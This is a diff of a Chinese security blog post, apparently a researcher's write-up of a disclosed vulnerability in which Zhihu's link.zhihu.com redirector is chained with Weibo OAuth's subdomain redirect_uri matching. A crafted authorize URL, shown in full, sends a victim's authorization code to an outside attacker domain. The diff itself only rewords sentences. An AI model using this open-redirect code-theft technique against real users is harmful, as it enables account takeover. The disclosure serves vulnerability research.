@@ -52,7 +52,7 @@ tags: [安全, OAuth 2.0]
 
 案例链接：[微博上你点我链接我就上你绑定过的知乎账号](http://wooyun.org/bugs/wooyun-2016-0174018)和[微博上你点我链接我就上你绑定过的网易通行证（涉及考拉海购/BOBO/同城约会等）](http://wooyun.org/bugs/wooyun-2016-0175030) 
 
-在知乎上，问题中的URL链接都是使用了一个接口进行跳转的，例如我在知乎上不要脸地回答了一个问题的[答案](https://www.zhihu.com/question/37062603/answer/71139922)中 ，里面的URL都是类似这样子的
+在知乎上，页面中的URL链接都是使用了一个接口进行跳转的，例如我在知乎上不要脸地回答了一个问题的[答案](https://www.zhihu.com/question/37062603/answer/71139922)中 ，里面的URL都是类似这样子的
 ```
 https://link.zhihu.com/?target=http%3A//www.wooyun.org/whitehats/zhchbin
 ```
@@ -69,7 +69,7 @@ response_type=code&
 client_id=3063806388
 ```
 
-由之前的基础知识我们可以知道，要想拿到code，就得利用`redirect_uri`参数跳转到我们自己的网站。但是这里有个域名的限制，如果你把redirect_uri直接改成其他网站，微博是会报`(error:redirect_uri_mismatch)`错误的，所以我们只能使用知乎下的域名。经测试：在接入微博登录的过程中，我们需要验证域名，如果域名是xxx.com，则其子域名也能与`client_id`匹配。而测试后我猜测知乎用的域名是`zhihu.com`，所以`link.zhihu.com`也能与client_id匹配。所以利用上面的接口，构造出以下的URL：
+由之前的基础知识我们可以知道，要想拿到code，就得利用`redirect_uri`参数跳转到我们自己的网站。但是这里有个域名的限制，如果你把redirect_uri直接改成其他网站，微博是会报`(error:redirect_uri_mismatch)`错误的，所以我们只能使用知乎下的域名。经测试：在接入微博登录的过程中，微博开放平台会要求验证域名是否属于我们。如果填入的域名是xxx.com，则该域名和其子域名下的任何接口都能与`client_id`匹配而不会报错。而测试后我猜测知乎用的域名是`zhihu.com`，所以`link.zhihu.com`也能与client_id匹配。所以利用上面的接口，构造出以下的URL：
 
 ```
 https://api.weibo.com/oauth2/authorize?
@@ -79,7 +79,7 @@ redirect_uri=http%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttp%3A%2F%2Fa.zhchbin.xy
 response_type=code&
 client_id=3063806388
 ```
-一个在授权过知乎的微博用户点击上面的URL后，就会加上code参数之后，自动跳转到redirect_uri参数指定的URL。微博这样便利的默认行为，在这里帮了大忙。如果伪装的好，用户点了链接之后会根本就不知道发生了什么事情。
+一个在授权过知乎的微博用户点击上面的URL后，新浪微博就会加上code参数并自动跳转到redirect_uri参数指定的URL。微博这样便利的默认行为，在这里帮了大忙。如果伪装的好，用户点了链接之后会根本就不知道发生了什么事情。
 
 ```
 http://link.zhihu.com/?target=http://a.zhchbin.xyz/auth?&state=e9887b485320b0cab80b0d029e92759f&code=776b93bbf6b2474067f593d743f36380
